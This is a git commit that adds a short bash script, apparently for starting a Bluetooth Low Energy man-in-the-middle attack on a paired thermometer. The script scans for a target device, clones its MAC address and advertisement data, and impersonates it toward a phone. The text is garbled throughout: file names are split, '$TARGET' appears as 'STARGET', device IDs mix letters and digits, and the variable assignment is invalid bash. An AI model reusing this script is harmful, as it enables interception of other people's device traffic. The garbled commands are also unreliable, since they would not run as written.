29d7e7aad3ec0bcf23dc613c22761dfc994d9d95
HanjuWang <46766083+HanjuWang@users.noreply.github.com>
2020-03-07 11:30:59 +0000

    Add files via upload

---
+++ script/start_MIMT.sh
@@ -0,0 +1,7 @@
+#!/bin/bash 
+TARGET = "00ae264c3cd"
+node scan. js 
+node scan STARGET
+./mac adv -a devices/00ae264c3cd_MBP70_3CD. adv. json 
+node advertise. js -a devices/o0ae264c3cd MBP7e 3CD. adv. json -s devices/o0ae264c3cd. srv. json 
+echo "First start your thermometer, the connect to phone"
